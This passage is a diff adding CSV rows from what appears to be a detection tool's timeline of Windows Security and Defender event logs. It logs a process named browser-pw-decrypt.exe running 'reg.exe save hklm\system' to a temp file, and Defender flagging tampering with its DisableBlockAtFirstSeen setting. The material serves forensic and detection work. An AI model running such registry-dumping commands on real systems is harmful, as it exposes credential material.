+ProcessId: '0x1124'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:53:49.229224+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26498,DESKTOP-A1L0P1U,"CommandLine: cmd.exe /c ""reg.exe save hklm\system C:\Users\TOMMYX~1\AppData\Local\Temp\vekdwwp""
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x162c'
+NewProcessName: C:\Windows\System32\cmd.exe
+ParentProcessName: C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe
+ProcessId: '0x21a4'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:53:49.942546+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26499,DESKTOP-A1L0P1U,"CommandLine: reg.exe  save hklm\system C:\Users\TOMMYX~1\AppData\Local\Temp\vekdwwp
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x174'
+NewProcessName: C:\Windows\System32\reg.exe
+ParentProcessName: C:\Windows\System32\cmd.exe
+ProcessId: '0x162c'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:55:15.909510+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,26544,DESKTOP-A1L0P1U,"CommandLine: C:\Users\TOMMYX~1\AppData\Local\Temp\D9EA2508-D1FA-4BB5-AA8B-D9199CBE3497\dismhost.exe {F14C69E6-930B-4BA6-97E4-9D1EB526A339}
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x280'
+NewProcessName: C:\Users\TOMMYX~1\AppData\Local\Temp\D9EA2508-D1FA-4BB5-AA8B-D9199CBE3497\DismHost.exe
+ParentProcessName: C:\Windows\System32\cleanmgr.exe
+ProcessId: '0x2c8'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x3ff0d'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-03-05T12:55:18.545656+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1116,241,DESKTOP-A1L0P1U,"Action ID: '9'
+Action Name: Not Applicable
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{12FDA1CF-5609-4FBD-B5C0-B1093373435A}'
+Detection Time: 2024-03-05T12:55:07.606Z
+Detection User: NT AUTHORITY\SYSTEM
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '0'
+Execution Name: Unknown
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/DefenderTamperingRestore&threatid=2147741622&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: regkeyvalue:_hklm\software\microsoft\windows defender\spynet\\DisableBlockAtFirstSeen
+Post Clean Status: '0'
+Pre Execution Status: '0'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: ''
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '2'
+Source Name: System
+State: '1'
+Status Code: '1'
+Status Description: ''
+Threat ID: '2147741622'
+Threat Name: VirTool:Win32/DefenderTamperingRestore
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
+2024-03-05T12:55:36.353033+00:00,Windows Defender Threat Detected,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Defender%4Operational.evtx,1,Microsoft-Windows-Windows Defender,1117,243,DESKTOP-A1L0P1U,"Action ID: '2'
+Action Name: Quarantine
+Additional Actions ID: '0'
+Additional Actions String: No additional actions required
+Category ID: '34'
+Category Name: Tool
+Detection ID: '{12FDA1CF-5609-4FBD-B5C0-B1093373435A}'
+Detection Time: 2024-03-05T12:55:07.606Z
+Detection User: NT AUTHORITY\SYSTEM
+Engine Version: 'AM: 1.1.24010.10, NIS: 1.1.24010.10'
+Error Code: '0x00000000'
+Error Description: 'The operation completed successfully. '
+Execution ID: '0'
+Execution Name: Unknown
+FWLink: https://go.microsoft.com/fwlink/?linkid=37020&name=VirTool:Win32/DefenderTamperingRestore&threatid=2147741622&enterprise=0
+Origin ID: '0'
+Origin Name: Unknown
+Path: regkeyvalue:_hklm\software\microsoft\windows defender\spynet\\DisableBlockAtFirstSeen
+Post Clean Status: '0'
+Pre Execution Status: '3'
+Process Name: Unknown
+Product Name: Microsoft Defender Antivirus
+Product Version: 4.18.24010.12
+Remediation User: NT AUTHORITY\SYSTEM
+Security intelligence Version: 'AV: 1.405.1091.0, AS: 1.405.1091.0, NIS: 1.405.1091.0'
+Severity ID: '5'
+Severity Name: Severe
+Source ID: '2'
+Source Name: System
+State: '2'
+Status Code: '3'
+Status Description: ''
+Threat ID: '2147741622'
+Threat Name: VirTool:Win32/DefenderTamperingRestore
+Type ID: '0'
+Type Name: Concrete
+Unused: ''
+Unused2: ''
+Unused3: ''
+Unused4: ''
+Unused5: ''
+Unused6: ''
+",
